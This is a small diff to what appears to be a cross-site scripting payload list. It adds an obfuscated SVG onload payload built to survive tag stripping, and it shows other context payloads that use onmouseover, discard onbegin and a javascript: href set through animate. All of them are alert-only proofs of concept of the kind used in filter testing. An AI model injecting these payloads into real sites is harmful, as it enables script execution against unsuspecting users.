@@ -2,6 +2,7 @@
 "onmouseover="alert(1)
 
 <svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
+">"><svg on"><sv">sv<svg onload=(alert)(1)>g onload=(alert)(1)>load=(alert)(1)>
 
 "><svg><discard%20onbegin=alert(1)>
 <svg><a><animate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F><text+x%3D20+y%3D20>Click%20me<%2Ftext><%2Fa>
